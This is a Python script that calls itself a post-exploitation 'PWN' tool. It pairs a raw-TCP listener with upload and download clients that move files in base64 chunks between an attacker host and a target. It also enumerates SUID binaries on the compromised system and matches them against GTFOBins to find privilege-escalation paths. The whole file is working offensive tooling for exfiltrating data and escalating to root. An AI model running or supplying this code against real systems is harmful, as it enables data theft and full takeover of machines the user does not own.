#!/usr/bin/env python3
"""
PWN Tool for Post Exploiotation
"""
import socket,base64,random,string,os,argparse,time,requests,subprocess,re

class PWNProtocol():
    HTTP = 1
    SSH  = 2
    TCP  = 3
    UDP  = 4


# Receiver class for PWN
class PWNReceiver:
    def __init__(self):
        self.server_address = '0.0.0.0'
        self.server_port = 8888
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client = None
        self.protocol = PWNProtocol.TCP
        self.source_directory = os.getcwd()
        self.output_directory = os.getcwd()
    def server_listen(self):
        if self.protocol == PWNProtocol.TCP:
            self.tcp_listen()
            self.handle_message()
    def tcp_listen(self):
        if self.protocol == PWNProtocol.TCP:
            self.server.bind((self.server_address, self.server_port))
            self.server.listen()
            print(f"[*] Listening on {self.server_address}:{str(self.server_port)}")
            conn, addr = self.server.accept()
            self.client = conn # set the connected client
            print(f"[+] Client connected {str(addr[0])}:{str(addr[1])}")
    def handle_message(self):
        try:
            if self.protocol == PWNProtocol.TCP:
                client_message = self.client.recv(256).decode().rstrip('\n').split(';')
                if len(client_message) >2:
                    file_name = client_message[0]
                    file_size = int(client_message[1])
                    method = client_message[2]
                    ack = client_message[3]
                    if method == 'upload':
                        self.__handle_tcp_upload(file_name,file_size,method,ack) # handling the upload request
                    if method == 'download':
                        self.__handle_tcp_download(file_name,method,ack)
        except Exception as e:
            print(e)
    def __handle_tcp_upload(self,n,s,m,a):
        uploaded = 0
        ack_resp = a+"\n"
        self.client.send(ack_resp.encode())
        file_data = b''
        fullpath = os.path.join(self.output_directory, n)
        with open(fullpath,'ab+') as f:
            while uploaded < s:
                b64_data = self.client.recv(64000).decode()
                orig_data = base64.b64decode(b64_data)
                uploaded += len(orig_data)
                f.write(orig_data)
                self.client.send("ok".encode())
                print(f"{str(uploaded)}/{str(s)}\r", end="")
        print(f"[+] File saved successfully as {fullpath}")
    def __handle_tcp_download(self,n,m,a):
        fragment_size = 8000
        sent = 0
        fullpath = os.path.join(self.source_directory,n)
        aborted = False
        with open(fullpath, 'rb') as df:
            data = df.read()
        file_size = len(data)
        chunks = [data[i:i+fragment_size] for i in range(0, len(data), fragment_size)]
        self.client.send(f"{n};{str(file_size)};{a}".encode())
        for c in chunks:
            sdata = base64.b64encode(c)
            self.client.send(sdata)
            sent += len(c)
            print(f"Sent: {str(sent)}/{str(file_size)}\r", end="")
            resp = self.client.recv(64).decode().rstrip('\n')
            if resp != 'ok':
                aborted = True
                break
        if aborted == False:
            print("[+] File Sent Successfully")
        else:
            print("[x] Failed to sent file")
        
        

# Uploader calsss  for PWN
class PWNUploader:
    def __init__(self):
        self.remote_port = 8888
        self.remote_address = '127.0.0.1'
        self.filename = ''
        self.protocol = PWNProtocol.TCP
        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.source_directory = os.getcwd()
    def connect(self):
        if self.protocol == PWNProtocol.TCP:    # If the used protocoll is TCP
            try:
                self.client.connect((self.remote_address,self.remote_port))
                print(f"[+] Successfully connected to target {self.remote_address}:{str(self.remote_port)}")
            except:
                print(f"[!] Failed to connect {self.remote_address}:{str(self.remote_port)}")
        
    def disconnect(self):
        if self.protocol == PWNProtocol.TCP:
            self.client.close()
            
    def upload(self):
        self.connect()
        if self.protocol == PWNProtocol.TCP:
            self.__tcp_upload() # TCP upload

    def __tcp_upload(self):
        if self.filename != '':
            try:
                fragment_size = 16000
                data = b''
                with open(self.filename,'rb') as sf:
                    data = sf.read()
                file_path, file_name = path_leaf(self.filename)
                file_size = len(data)
                ack = get_random_str(8)
                aborted = False
                # send message with important data
                self.client.send(f"{file_name};{str(file_size)};upload;{ack}\n".encode())
                received = self.client.recv(128).decode().rstrip('\n')
                if received == ack:
                    if len(data)<fragment_size:
                        send_data = base64.b64encode(data)
                        self.client.send(send_data)
                    else:
                        uploaded = 0
                        chunks = [data[i:i+fragment_size] for i in range(0, len(data), fragment_size)]
                        for c in chunks:
                            send_data = base64.b64encode(c)
                            self.client.send(send_data)
                            uploaded += len(c)
                            print(f"Uploaded: {str(uploaded)}/{file_size}\r", end="")
                            ok_msg = self.client.recv(64).decode().rstrip('\n')
                            if ok_msg != "ok": 
                                aborted = True
                                break
                    
                  
                    if aborted == False:
                        print("[+] Upload Successfully!")
                    else:
                        print("[!] Failed to upload file")
                    
                else:
                    print("[!] ACK Mismatch!")
            except Exception as e:
                print(e)
        else:
            print("[!] Error. The File name cannot be empty!")
        
    
    


# Downloader clas for PWN    
class PWNDownloader:
    def __init__(self):
        self.remote_port = 8888
        self.remote_address = '127.0.0.1'
        self.filename = ''
        self.protocol = PWNProtocol.TCP
        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.output_directory = os.getcwd()
    def connect(self):
        if self.protocol == PWNProtocol.TCP:
            try:
                self.client.connect((self.remote_address,self.remote_port))
                print(f"[+] Successfully connected to target {self.remote_address}:{str(self.remote_port)}")
            except:
                print(f"[!] Failed to connect {self.remote_address}:{str(self.remote_port)}")
    def download(self):
        self.connect()
        if self.protocol == PWNProtocol.TCP:
            self.__tcp_download() # TCP upload        
        
    def __tcp_download(self):
        if self.filename != '':
            try:
                fragment_size = 18000
                ack = get_random_str(8)
                dl_req = f"{self.filename};0;download;{ack}"
                self.client.send(dl_req.encode())
                file_data = self.client.recv(256).decode().rstrip('\n').split(';')
                if len(file_data) == 3:
                    file_name = file_data[0]
                    file_size = int(file_data[1])
                    ack_resp = file_data[2]
                    downloaded = 0
                    if ack_resp == ack:
                        # start download
                        fullpath = os.path.join(self.output_directory,file_name)
                        with open(fullpath,"ab+") as df:
                            while downloaded < file_size:
                                recv_b64 = self.client.recv(fragment_size)
                                orig_data = base64.b64decode(recv_b64)
                                downloaded += len(orig_data)
                                df.write(orig_data)
                                print(f"Download: {str(downloaded)}/{str(file_size)}\r",end="")
                                self.client.send('ok'.encode())
                        print("[+] File Download successfully!")
                    else:
                        print("[!] ACK Mismatch!")
                    
            except Exception as x:
                print("[x] Download Failed!")
                print(x)
        


class PWNPrivesc():
    def __init__(self):
        pass
    def get_suid_files(self):
        print("SUID Binaries\n-------------\n")
        os.system("find / -type f -perm -u=s 2>/dev/null")
        self.suid_privesc()
    def suid_privesc(self):
        proc = subprocess.Popen('/usr/bin/find / -type f -perm -u=s'.split(), stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
        output = proc.stdout.read()
        bins = output.decode().split('\n')
        suid_binaries = []
        for b in bins:
            base, name = os.path.split(b)
            suid_binaries.append(name)
        result = requests.get('https://gtfobins.github.io')
        matches = re.findall(r'<li>.*/gtfobins/.*',result.text,re.I|re.M)
        binaries = []
        for m in matches:
            binaries.append(m.split("/")[2])
        uniq = list(set(binaries))
        print("\nPrivesc:\n--------\n")
        for s in suid_binaries:
            if s in uniq:
                print(f"[!] Privesc: {s}")        

# Variables for the application
server_mode = False
port = 8888
listen_address = '0.0.0.0'
protocol = PWNProtocol.TCP
upload_file = ''
target_address = '127.0.0.1'
download_file = ''
source_directory = os.getcwd()
output_directory = os.getcwd()

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-S','--server',action="store_true",help="Set up a server")
    parser.add_argument('-p','--port',help="Set up a port")
    parser.add_argument('-t','--target',help="Set up a target address")
    parser.add_argument('-l','--listen-address',dest="listen",help="Set up a listeniong address for thge server")
    parser.add_argument('-T','--tcp',dest="tcp",action="store_true",help="Set up a transport mode")
    parser.add_argument('-u','--upload',dest="upload",help="Set up an uploadable file")
    parser.add_argument('-d','--download',dest="download",help="Set up a downloadable file")
    parser.add_argument('-D','--source-dir',dest="sourcedir",help="Set up a source directory")
    parser.add_argument('-O','--output-dir',dest="outdir",help="Set up an output directory")
    parser.add_argument('--suid',dest="suid",action="store_true",help="Print SUID files")
    return parser.parse_args();
    
def get_random_str(length):
    # Random string with the combination of lower and upper case
    letters = string.ascii_letters+string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def path_leaf(path):
    fpath, fname = os.path.split(path)
    return fpath, fname


# The main thread of PWN
def main():
    global server_mode,port,listen_address,protocol, upload_file, target_address, download_file,source_directory,output_directory
    
    args = parse_arguments()
    if args.server: server_mode = True
    if args.port: port = int(args.port)
    if args.listen: listen_address = args.listen
    if args.tcp: protocol = PWNProtocol.TCP
    if args.upload: upload_file = args.upload
    if args.target: target_address = args.target
    if args.download: download_file = args.download
    if args.sourcedir: source_directory = args.sourcedir
    if args.outdir: output_directory = args.outdir
    
    
    
    if server_mode:
        server = PWNReceiver()
        server.protocol = protocol # set up the protocol
        server.server_address = listen_address
        server.server_port = port
        server.source_directory = source_directory
        server.output_directory = output_directory
        server.server_listen()
    else:
        if args.upload:
            U = PWNUploader()
            U.protocol = protocol
            U.remote_address = target_address
            U.remote_port = port
            U.filename = upload_file
            U.upload()
        if args.download:
            D = PWNDownloader()
            D.filename = download_file
            D.protocol = protocol
            D.remote_address = target_address
            D.remote_port = port
            D.output_directory = output_directory
            D.download()
        if args.suid:
            P = PWNPrivesc()
            P.get_suid_files()
        


main()
